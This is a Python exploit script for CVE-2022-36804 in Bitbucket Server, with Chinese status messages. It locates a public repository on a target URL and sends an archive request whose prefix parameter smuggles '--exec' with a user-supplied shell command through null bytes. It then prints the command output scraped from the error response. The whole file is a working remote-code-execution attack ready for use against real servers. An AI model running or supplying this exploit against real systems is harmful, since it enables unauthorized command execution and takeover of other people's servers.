import argparse
import requests
import re
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36'
}


class main:
    def GetArgv(self):
        parse = argparse.ArgumentParser()
        parse.add_argument("-u", type=str, default=None, help="Remote Target URL", dest="url")
        parse.add_argument("-cmd", type=str, default="id", help="Execute Command", dest="cmd")
        arg = parse.parse_args()  # 解析参数
        return arg

    def Exp(self, url, cmd):
        test_url = f'{url}repos?visibility=public'
        resp = requests.get(test_url, headers=headers).text
        title = re.findall('<title>(.*?)</title>', resp)
        vul_url = re.findall(',"self":\[\{"href":"(.*?)/browse"}]}}', resp)
        if title[0] == 'Public Repositories - Bitbucket':
            projects = vul_url[0].split(url,2)[1]
            POC = f'rest/api/latest/{projects}/archive?filename=wN3Am&at=wN3Am&path=wN3Am&prefix=ax%00--exec=%60{cmd}%60%00--remote=origin'
            result = requests.get(url=f'{url}{POC}',headers=headers)
            final_result = re.findall('1: (.*?):', result.text)
            if result.status_code == 500:
                print(f'[+]{final_result[0]}')
            else:
                print('[-]不存在CVE-2022-36804漏洞')
        else:
            print('[-]不存在CVE-2022-36804漏洞')


if __name__ == '__main__':
    parser = main().GetArgv()
    exp = main().Exp(url=parser.url,cmd=parser.cmd)
